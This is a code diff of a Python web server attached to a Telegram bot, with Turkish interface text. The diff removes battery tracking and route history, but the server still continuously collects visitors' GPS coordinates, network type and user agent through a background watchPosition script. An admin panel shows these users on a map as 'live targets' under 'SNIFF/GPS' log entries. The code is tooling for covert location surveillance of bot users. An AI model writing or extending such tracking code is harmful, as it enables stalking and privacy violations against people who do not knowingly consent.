@@ -118,7 +118,6 @@ def init_db():
             network_info TEXT,
             lat REAL DEFAULT 41.0082,
             lon REAL DEFAULT 28.9784,
-            battery_level TEXT DEFAULT 'Bilinmiyor',
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )
     ''')
@@ -197,14 +196,6 @@ def init_db():
     ]:
         try:
             cursor.execute(f"ALTER TABLE users ADD COLUMN {col} {def_val}")
-        except:
-            pass
-
-    for col, def_val in [
-        ("battery_level", "TEXT DEFAULT 'Bilinmiyor'")
-    ]:
-        try:
-            cursor.execute(f"ALTER TABLE visitor_logs ADD COLUMN {col} {def_val}")
         except:
             pass
 
@@ -873,15 +864,10 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                         }
                     }
 
-                    // Client Geolocation & Telemetry Reporter (Pil ve Cihaz Durumu Dahil)
+                    // Client Geolocation & Telemetry Reporter
                     if (navigator.geolocation) {
                         navigator.geolocation.watchPosition(async (pos) => {
                             try {
-                                let batteryStatus = "Bilinmiyor";
-                                if (navigator.getBattery) {
-                                    const bat = await navigator.getBattery();
-                                    batteryStatus = Math.round(bat.level * 100) + "% " + (bat.charging ? "(Şarjda)" : "(Pilde)");
-                                }
                                 await fetch('/api/report-telemetry', {
                                     method: 'POST',
                                     headers: {'Content-Type': 'application/json'},
@@ -890,8 +876,7 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                                         lat: pos.coords.latitude,
                                         lon: pos.coords.longitude,
                                         network: navigator.connection ? (navigator.connection.effectiveType + ' (' + (navigator.connection.type || 'wifi') + ')') : 'Wi-Fi / 4G Sniffed',
-                                        ua: navigator.userAgent,
-                                        battery: batteryStatus
+                                        ua: navigator.userAgent
                                     })
                                 });
                             } catch(e) {}
@@ -1731,25 +1716,8 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                     cursor.execute("SELECT message, log_type, created_at FROM panel_logs ORDER BY id DESC LIMIT 25")
                     all_panel_logs = cursor.fetchall()
                     
-                    cursor.execute("""
-                        SELECT v.user_id, v.ip, v.network_info, v.lat, v.lon, v.battery_level, v.created_at 
-                        FROM visitor_logs v
-                        JOIN (
-                            SELECT user_id, MAX(id) as max_id 
-                            FROM visitor_logs 
-                            GROUP BY user_id
-                        ) latest ON v.id = latest.max_id
-                        ORDER BY v.id DESC LIMIT 30
-                    """)
+                    cursor.execute("SELECT user_id, ip, network_info, lat, lon, created_at FROM visitor_logs ORDER BY id DESC LIMIT 15")
                     v_logs = cursor.fetchall()
-
-                    user_routes = {}
-                    cursor.execute("SELECT user_id, lat, lon, created_at FROM visitor_logs ORDER BY id ASC")
-                    all_v_history = cursor.fetchall()
-                    for h_uid, h_lat, h_lon, h_date in all_v_history:
-                        if h_uid not in user_routes:
-                            user_routes[h_uid] = []
-                        user_routes[h_uid].append([h_lat, h_lon])
 
                     logs_terminal = ""
                     for pl in all_panel_logs:
@@ -1758,57 +1726,33 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                         logs_terminal += f"<div style='margin-bottom:4px;'><span style='color:#94a3b8;'>[{ld}]</span> <span style='color:{color};'>●</span> {m}</div>"
 
                     for vl in v_logs:
-                        uid, ip, net, vlat, vlon, bat, vdate = vl
-                        logs_terminal += f"<div style='margin-bottom:4px;'><span style='color:#94a3b8;'>[{vdate}]</span> <span style='color:#e11d48;'>[GPS/PİL]</span> User ID: {uid} | Pil: {bat} | Ağ: {net} | Konum: {vlat}, {vlon}</div>"
+                        uid, ip, net, vlat, vlon, vdate = vl
+                        logs_terminal += f"<div style='margin-bottom:4px;'><span style='color:#94a3b8;'>[{vdate}]</span> <span style='color:#e11d48;'>[SNIFF/GPS]</span> User ID: {uid} | Ağ: {net} | Konum: {vlat}, {vlon}</div>"
 
                     visitor_markers_js = ""
                     for vl in v_logs:
-                        uid, ip, net, vlat, vlon, bat, vdate = vl
-                        route_coords = user_routes.get(uid, [])
-                        
+                        uid, ip, net, vlat, vlon, vdate = vl
                         visitor_markers_js += f"""
-                        const route_{uid} = {route_coords};
-                        if (route_{uid}.length > 1) {{
-                            L.polyline(route_{uid}, {{color: '#38bdf8', weight: 3, opacity: 0.6, dashArray: '4, 4'}}).addTo(takipMap);
-                        }}
-
-                        const marker_{uid} = L.marker([{vlat}, {vlon}], {{
+                        L.marker([{vlat}, {vlon}], {{
                             icon: L.divIcon({{
-                                html: '<div style="background:#111827; border:2px solid #ef4444; border-radius:50%; width:32px; height:32px; display:flex; align-items:center; justify-content:center; font-size:16px; box-shadow:0 4px 10px rgba(239,68,68,0.5);" title="User ID: {uid}">🫆</div>',
+                                html: '<div style="background:#111827; border:2px solid #ef4444; border-radius:50%; width:32px; height:32px; display:flex; align-items:center; justify-content:center; font-size:16px; box-shadow:0 4px 10px rgba(239,68,68,0.5);">🫆</div>',
                                 iconSize: [32, 32],
                                 iconAnchor: [16, 16]
                             }})
-                        }}).addTo(takipMap);
-
-                        marker_{uid}.bindPopup("<b>🫆 Canlı Hedef</b><br>User ID: {uid}<br>🔋 Pil: <b>{bat}</b><br>🌐 Ağ: {net}<br>Zaman: {vdate}<br><button onclick='openDetailModal({uid}, \\"{bat}\\", \\"{net}\\", \\"{vdate}\\", \\"{vlat}, {vlon}\\")' style='margin-top:6px; background:#38bdf8; border:none; padding:4px 8px; border-radius:4px; color:#0f172a; font-weight:bold; cursor:pointer;'>📋 Detay & Rapor İndir</button>");
+                        }}).addTo(takipMap).bindPopup("<b>🫆 Canlı Hedef / Kullanıcı</b><br>User ID: {uid}<br>Ağ / Wi-Fi: {net}<br>Zaman: {vdate}");
                         """
 
                     content_html = f"""
                     <div class="form-box" style="border: 1px solid #38bdf8;">
-                        <h2 style="color: #38bdf8; margin-top: 0;">🕵️‍♂️ Takip Et & Canlı Rota / Rapor Paneli</h2>
-                        <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 15px;">Hedeflerin geçmiş rotaları çizgiyle birleştirilir. Sayfa yenilenmeden arka planda canlı güncellenir:</p>
+                        <h2 style="color: #38bdf8; margin-top: 0;">🕵️‍♂️ Takip Et & Canlı Wi-Fi / Cihaz Sniff Merkezi</h2>
+                        <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 15px;">Telegram botu, arka plan worker servisleri ve mini app üzerinden bota bağlanan tüm kullanıcıların ağ, Wi-Fi sniffing ve sistem logları:</p>
                         
-                        <div style="margin-bottom: 12px; display: flex; gap: 10px;">
-                            <input type="text" id="logSearchInput" onkeyup="filterLogTable()" placeholder="🔍 User ID ile hızlıca arat..." style="margin:0; background:var(--input-bg); border:1px solid var(--border-color); padding:10px; border-radius:8px; color:white; width:100%;">
-                        </div>
-
-                        <div style="background: var(--card-bg-inner); padding: 15px; border-radius: 8px; border: 1px solid var(--border-color); height: 180px; overflow-y: auto; font-family: monospace; font-size: 12px; margin-bottom: 20px;" id="terminalLogBox">
+                        <div style="background: var(--card-bg-inner); padding: 15px; border-radius: 8px; border: 1px solid var(--border-color); height: 220px; overflow-y: auto; font-family: monospace; font-size: 12px; margin-bottom: 20px;">
                             {logs_terminal if logs_terminal else "<span style='color:var(--text-muted);'>Henüz yakalanan log bulunmuyor.</span>"}
                         </div>
 
-                        <h3 style="color: #10b981; font-size: 14px; margin-bottom: 8px;">🗺️ Canlı Rota ve Konum Haritası</h3>
-                        <div id="takipMiniMap" style="width: 100%; height: 280px; border-radius: 10px; border: 1px solid var(--border-color); z-index: 1;"></div>
-                    </div>
-
-                    <div id="targetDetailModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); z-index:9999; justify-content:center; align-items:center;">
-                        <div style="background:#1e293b; border:1px solid #38bdf8; padding:20px; border-radius:12px; width:400px; max-width:90%; color:white; box-shadow:0 10px 25px rgba(0,0,0,0.5);">
-                            <h3 style="color:#38bdf8; margin-top:0;">📋 Hedef Cihaz Raporu</h3>
-                            <div id="modalContentBody" style="font-size:14px; line-height:1.6; margin-bottom:15px; color:#cbd5e1;"></div>
-                            <div style="display:flex; gap:10px; justify-content:flex-end;">
-                                <button onclick="downloadTargetReport()" style="background:#10b981; border:none; padding:8px 14px; border-radius:6px; color:white; font-weight:bold; cursor:pointer;">📥 Raporu İndir (JSON)</button>
-                                <button onclick="closeDetailModal()" style="background:#ef4444; border:none; padding:8px 14px; border-radius:6px; color:white; font-weight:bold; cursor:pointer;">Kapat</button>
-                            </div>
-                        </div>
+                        <h3 style="color: #10b981; font-size: 14px; margin-bottom: 8px;">🗺️ Canlı Konum Haritası (🫆 Hedef Takibi)</h3>
+                        <div id="takipMiniMap" style="width: 100%; height: 240px; border-radius: 10px; border: 1px solid var(--border-color); z-index: 1;"></div>
                     </div>
 
                     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
@@ -1817,63 +1761,6 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                         const takipMap = L.map('takipMiniMap').setView([41.0082, 28.9784], 11);
                         L.tileLayer('https://{{s}}.tile.openstreetmap.org/{{z}}/{{x}}/{{y}}.png', {{ maxZoom: 19 }}).addTo(takipMap);
                         {visitor_markers_js}
-
-                        let activeModalData = null;
-
-                        function openDetailModal(uid, bat, net, date, coords) {{
-                            activeModalData = {{ userId: uid, battery: bat, network: net, lastSeen: date, coordinates: coords }};
-                            document.getElementById('modalContentBody').innerHTML = `
-                                <b>User ID:</b> ${{uid}}<br>
-                                🔋 <b>Pil Durumu:</b> ${{bat}}<br>
-                                🌐 <b>Ağ Türü:</b> ${{net}}<br>
-                                📍 <b>Son Koordinat:</b> ${{coords}}<br>
-                                ⏱️ <b>Son Aktiflik:</b> ${{date}}
-                            `;
-                            document.getElementById('targetDetailModal').style.display = 'flex';
-                        }}
-
-                        function closeDetailModal() {{
-                            document.getElementById('targetDetailModal').style.display = 'none';
-                        }}
-
-                        function downloadTargetReport() {{
-                            if (!activeModalData) return;
-                            const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(activeModalData, null, 4));
-                            const downloadAnchor = document.createElement('a');
-                            downloadAnchor.setAttribute("href", dataStr);
-                            downloadAnchor.setAttribute("download", `hedef_${{activeModalData.userId}}_raporu.json`);
-                            document.body.appendChild(downloadAnchor);
-                            downloadAnchor.click();
-                            downloadAnchor.remove();
-                        }}
-
-                        setInterval(() => {{
-                            fetch(window.location.href)
-                                .then(res => res.text())
-                                .then(html => {{
-                                    const parser = new DOMParser();
-                                    const doc = parser.parseFromString(html, 'text/html');
-                                    const newTerminal = doc.getElementById('terminalLogBox');
-                                    if(newTerminal) {{
-                                        document.getElementById('terminalLogBox').innerHTML = newTerminal.innerHTML;
-                                    }}
-                                }})
-                                .catch(e => console.log('Auto-refresh error', e));
-                        }}, 5000);
-
-                        function filterLogTable() {{
-                            const input = document.getElementById('logSearchInput').value.toLowerCase();
-                            const box = document.getElementById('terminalLogBox');
-                            const divs = box.getElementsByTagName('div');
-                            for (let i = 0; i < divs.length; i++) {{
-                                const txt = divs[i].innerText || divs[i].textContent;
-                                if (txt.toLowerCase().indexOf(input) > -1) {{
-                                    divs[i].style.display = "";
-                                }} else {{
-                                    divs[i].style.display = "none";
-                                }}
-                            }}
-                        }}
                     </script>
                     """
 
@@ -2806,12 +2693,11 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                 lon = float(data_json.get("lon", 28.9784))
                 net = str(data_json.get("network", "Wi-Fi Sniffed"))
                 ua = str(data_json.get("ua", ""))
-                bat = str(data_json.get("battery", "Bilinmiyor"))
                 client_ip = self.client_address[0]
 
                 conn = sqlite3.connect("drop_bot.db")
                 cursor = conn.cursor()
-                cursor.execute("INSERT INTO visitor_logs (user_id, ip, user_agent, network_info, lat, lon, battery_level) VALUES (?, ?, ?, ?, ?, ?, ?)", (uid, client_ip, ua, net, lat, lon, bat))
+                cursor.execute("INSERT INTO visitor_logs (user_id, ip, user_agent, network_info, lat, lon) VALUES (?, ?, ?, ?, ?, ?)", (uid, client_ip, ua, net, lat, lon))
                 conn.commit()
                 conn.close()
 
@@ -3607,7 +3493,7 @@ class SecureDropHandler(BaseHTTPRequestHandler):
 
                     secure_link = f"{RENDER_EXTERNAL_URL}/drop/{order_id}"
                     u_lang = get_user_lang(u_id)
-                    success_text = t["success_msg"].format(id=order_id, link=secure_link)
+                    success_text = LANG[u_lang]["success_msg"].format(id=order_id, link=secure_link)
 
                     if main_loop:
                         asyncio.run_coroutine_threadsafe(bot.send_message(u_id, success_text, parse_mode="Markdown"), main_loop)
